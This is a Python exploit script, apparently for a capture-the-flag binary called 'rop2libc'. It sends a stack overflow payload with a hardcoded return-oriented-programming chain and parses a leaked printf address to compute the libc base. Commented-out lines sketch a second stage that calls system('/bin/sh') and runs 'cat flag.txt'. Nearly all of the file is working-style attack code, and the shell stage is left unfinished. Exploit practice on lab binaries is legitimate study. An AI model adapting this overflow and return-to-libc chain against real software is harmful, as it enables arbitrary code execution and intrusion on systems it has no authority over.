#!/usr/bin/python
import os
import subprocess, time
import pty
import struct

# Create the process
master, slave = pty.openpty()
process = subprocess.Popen(["./rop2libc"], stdin=subprocess.PIPE, stdout=slave)
sout = os.fdopen(master, "r")

# Send the initial overflow and read result
print("Sending initial overflow")
process.stdin.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x34\x06\x40\x00\x00\x00\x00\x00\x2a\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x0013131313\x18\x10\x60\x00\x00\x00\x00\x00\x54\x06\x40\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00PPPPPPPP\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x001313131314141414\x48\x10\x60\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00PPPPPPPP\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x10\x60\x00\x00\x00\x00\x001313131314141414\x4c\x10\x60\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00" + "\n")
time.sleep(1)
print(sout.readline())
print(sout.readline())
leak = sout.readline()

# Get the libc base
leak = leak.replace("You said: ","")
printf_addr = struct.unpack("<Q", leak[0:6])[0]
print(hex(printf_addr))

# Calculate the system() and "/bin/sh" addresses
#system_addr = libc_base + 0x3fcd0
#binsh_addr = 0x0804a824
#binsh_addr = libc_base + 0x15DA84
#system_addr = printf_addr
#binsh_addr = 0x8048520 + 11

# Send the system() call
#print("Running system()")
#process.stdin.write("AAAA" + struct.pack("<I", system_addr) + "CCCC" + struct.pack("<I", binsh_addr) + "\n")
#time.sleep(1)
#print(sout.readline())

# Send command
#print("Sending command")
#process.stdin.write("cat flag.txt\n")
#time.sleep(1)
#print(sout.readline())
